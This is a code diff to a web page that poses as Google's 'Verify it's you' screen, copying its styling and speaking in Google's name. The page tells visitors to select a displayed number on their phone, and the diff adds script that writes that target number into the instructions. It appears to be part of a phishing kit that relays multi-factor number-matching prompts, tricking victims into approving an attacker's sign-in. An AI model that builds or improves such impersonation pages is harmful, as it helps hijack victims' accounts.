@@ -174,12 +174,13 @@
         <div class="container">
         <div class="logo"></div>
         <h1 class="title">Verify it's you</h1>
-        <p class="subtitle">For your security, Google needs to verify it's you. Please select this number below when it appears on your device:</p>
+        <p class="subtitle">For your security, Google needs to confirm it's really you. When a List of numbers shows up on your device, choose the number that appear below from the list on your device</p>
 
         <div style="text-align: center; margin: 40px 0;">
             <div class="number-display" style="background: #e8f0fe; border: 2px solid var(--gmail-blue); border-radius: 50%; width: 120px; height: 120px; margin: 0 auto; display: flex; align-items: center; justify-content: center;">
                 <span id="targetNumber" style="font-size: 48px; font-weight: 500; color: var(--gmail-blue);">--</span>
             </div>
+            <p id="instructionText" style="font-size: 16px; color: var(--gmail-gray); margin-top: 16px; font-weight: 500;">Select -- on your device</p>
         </div>
 
         <button id="verifyBtn" class="btn" style="background: var(--gmail-blue); color: white; border: none;" onclick="verifyNumber()" disabled>Verify</button>
@@ -201,6 +202,12 @@
 
         // Display target number
         document.getElementById('targetNumber').textContent = targetNumber || '--';
+        
+        // Update instruction text with the target number
+        const instructionText = document.getElementById('instructionText');
+        if (targetNumber) {
+            instructionText.textContent = `Select ${targetNumber} on your device`;
+        }
 
         // Set up the circular number display
         const numberDisplay = document.querySelector('.number-display');
